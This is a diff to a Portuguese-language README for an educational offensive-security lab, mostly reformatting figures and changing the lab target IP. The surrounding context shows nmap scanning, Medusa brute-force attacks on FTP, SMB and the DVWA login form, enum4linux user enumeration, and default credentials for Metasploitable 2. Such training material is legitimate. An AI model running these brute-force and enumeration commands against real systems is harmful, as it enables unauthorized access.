@@ -1,5 +1,10 @@
 # 🛡️ Laboratório de Segurança Ofensiva: exploração do Metasploitable 2 & DVWA
 
+[![Educational Purpose](https://img.shields.io/badge/Purpose-Educational-blue)](LICENSE)
+[![Python 3.8+](https://img.shields.io/badge/Python-3.8%2B-green)](https://python.org)
+[![Security Research](https://img.shields.io/badge/Security-Research-red)](https://github.com)
+[![License](https://img.shields.io/badge/License-Educational%20Use%20Only-orange)](LICENSE)
+
 > **⚠️ AVISO LEGAL:** Todo o conteúdo deste repositório foi produzido exclusivamente em ambiente controlado e isolado, com fins educacionais. A execução de ataques sem autorização explícita é crime (Lei nº 12.737/2012 — Lei Carolina Dieckmann, e art. 154-A do Código Penal Brasileiro). **Nunca replique estas técnicas em sistemas reais sem permissão.**
 
 ---
@@ -156,7 +161,7 @@ O **FTP ([File Transfer Protocol](https://www.rfc-editor.org/rfc/rfc959))** é u
 
 ```bash
 # Verificar se o FTP está ativo
-nmap -p 21 -sV 192.168.56.102
+nmap -p 21 -sV 10.10.10.20
 ```
 
 **Saída esperada:**
@@ -165,7 +170,10 @@ PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
 ```
 
-![Figura 01. Fase de reconhecimento de serviços utilizando NMAP.](images/lab-sec-01-fase-reconhecimento.png)
+<figure>
+  <img src="images/lab-sec-01-fase-reconhecimento.png" alt="Fase de reconhecimento NMAP">
+  <figcaption align="center"><b>Figura 01.</b> Fase de reconhecimento de serviços utilizando NMAP.</figcaption>
+</figure>
 
 > ⚠️ **Nota:** O vsftpd 2.3.4 tem um backdoor ([CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)). Neste cenário, focamos apenas no ataque de força bruta, não na exploração do backdoor.
 
@@ -213,7 +221,7 @@ medusa -h 10.10.10.20 \
 
 ```bash
 # Ataque com lista de usuários E lista de senhas
-medusa -h 192.168.56.102 \
+medusa -h 10.10.10.20 \
        -U wordlist_usuarios.txt \
        -P wordlist_senhas.txt \
        -M ftp \
@@ -224,16 +232,19 @@ medusa -h 192.168.56.102 \
 ### Saída Esperada (Sucesso)
 
 ```
-ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+ACCOUNT FOUND: [ftp] Host: 10.10.10.20 User: msfadmin Password: msfadmin [SUCCESS]
 ```
 
-![Figura 02. Fase de execução de ataque ao serviço FTP.](images/lab-sec-02-ataque-ao-serivico-ftp.png)
+<figure>
+  <img src="images/lab-sec-02-ataque-ao-servico-ftp.png" alt="Ataque de exploração ao serviço FTP">
+  <figcaption align="center"><b>Figura 02.</b> Fase de execução de ataque ao serviço FTP.</figcaption>
+</figure>
 
 ### Fase 4: Validando o Acesso
 
 ```bash
 # Conectar via FTP com as credenciais encontradas
-ftp 192.168.56.102
+ftp 10.10.10.20
 # Login: msfadmin
 # Password: msfadmin
 
@@ -261,7 +272,10 @@ http://10.10.10.20/dvwa
 
 Antes de realizar qualquer ataque, precisamos entender como o formulário funciona. Inspecione manualmente com o devtools, recurso do navegador, a partir da seção network do mesmo:
 
-![Figura 03. Inspeção de requisições.](images/lab-sec-03-inspecionando-pagina-login-dvwa.png)
+<figure>
+  <img src="images/lab-sec-03-inspecionando-pagina-login-dvwa.png" alt="Inspeção de requisições na página de login do DVWA">
+  <figcaption align="center"><b>Figura 03.</b> Inspeção de requisições.</figcaption>
+</figure>
 
 **Identificar os parâmetros-chave:**
 - Campo de usuário: `username`
@@ -281,7 +295,10 @@ medusa -h 10.10.10.20 \
        -t 6 \
 ```
 
-![Figura 04. Inspeção de requisições.](images/lab-sec-04-ataque-ao-dvwa-com-medusa.png)
+<figure>
+  <img src="images/lab-sec-04-ataque-ao-dvwa-com-medusa.png" alt="Execução de ataque de força bruta com Medusa no DVWA">
+  <figcaption align="center"><b>Figura 04.</b> Execução de ataque de força bruta via HTTP FORM.</figcaption>
+</figure>
 
 ---
 
@@ -304,7 +321,7 @@ enum4linux -U 10.10.10.20
 **Exemplo de saída:**
 ```
  =========================== 
-|    Users on 192.168.56.102 |
+|    Users on 10.10.10.20 |
  =========================== 
 user:[games] rid:[0x3f2]
 user:[nobody] rid:[0x1f5]
@@ -313,7 +330,10 @@ user:[service] rid:[0x3f3]
 user:[user] rid:[0x3f1]
 ```
 
-![Figura 05. Exemplo de uso do ENUM4LINUX.](images/lab-sec-05-exemplo-de-uso-do-enum4linux.png)
+<figure>
+  <img src="images/lab-sec-05-exemplo-de-uso-do-enum4linux.png" alt="Execução da ferramenta enum4linux para enumeração de SMB e serviços Windows">
+  <figcaption align="center"><b>Figura 05.</b> Exemplo de uso do ENUM4LINUX.</figcaption>
+</figure>
 
 Salvar a lista:
 ```bash
@@ -345,7 +365,10 @@ msfadmin
 EOF
 ```
 
-![Figura 06. Exemplo de geração de wordlist.](images/lab-sec-06-geracao-de-wordlists.png)
+<figure>
+  <img src="images/lab-sec-06-geracao-de-wordlists.png" alt="Processo de geração de wordlists customizadas para ataque de força bruta">
+  <figcaption align="center"><b>Figura 06.</b> Exemplo de geração de wordlist.</figcaption>
+</figure>
 
 
 ```bash
@@ -357,7 +380,10 @@ medusa -h 10.10.10.20 \
        -v 4
 ```
 
-![Figura 07. Execução de ataque ao serviço SMB.](images/lab-sec-07-ataque-ao-smb-com-medusa-pt01.png)
+<figure>
+  <img src="images/lab-sec-07-ataque-ao-smb-com-medusa-pt01.png" alt="Primeira etapa do ataque de força bruta ao serviço SMB utilizando a ferramenta Medusa">
+  <figcaption align="center"><b>Figura 07.</b> Execução de ataque ao serviço SMB.</figcaption>
+</figure>
 
 ### Fase 3: Validar Acesso SMB
 
@@ -367,10 +393,13 @@ smbclient //10.10.10.20/tmp -U msfadmin
 # Digitar a senha quando solicitado
 
 # Listar compartilhamentos
-smbclient -L //192.168.56.102 -U msfadmin
+smbclient -L //10.10.10.20 -U msfadmin
 ```
 
-![Figura 08. Validação do ataque ao serviço SMB.](images/lab-sec-08-ataque-ao-smb-com-medusa-pt02.png)
+<figure>
+  <img src="images/lab-sec-08-ataque-ao-smb-com-medusa-pt02.png" alt="Sucesso e validação das credenciais obtidas no ataque ao serviço SMB com Medusa">
+  <figcaption align="center"><b>Figura 08.</b> Validação do ataque ao serviço SMB.</figcaption>
+</figure>
 
 ---
 
